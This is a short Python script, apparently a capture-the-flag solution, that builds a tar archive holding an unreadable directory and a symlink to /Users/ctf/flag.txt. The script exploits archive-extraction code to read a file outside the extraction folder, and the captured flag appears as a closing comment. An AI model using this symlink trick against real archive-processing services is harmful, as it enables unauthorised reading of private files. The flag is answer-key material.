import tarfile
import io

with tarfile.open("./out.tar", "w") as tar:
    hello = tarfile.TarInfo("hello")
    hello.type = tarfile.DIRTYPE
    hello.mode = 0o300  # not readable, so glob won't be able to find the symlink
    tar.addfile(hello)

    world = tarfile.TarInfo("world")  # to leak folder name
    world.type = tarfile.REGTYPE
    world.mode = 0o400
    world.size = 5
    tar.addfile(world, io.BytesIO(b"world"))

    link = tarfile.TarInfo("hello/link")
    link.type = tarfile.SYMTYPE
    link.mode = 0o400
    link.linkname = "/Users/ctf/flag.txt"
    tar.addfile(link)
# DUCTF{are_symlinks_really_worth_the_trouble_they_cause?????}
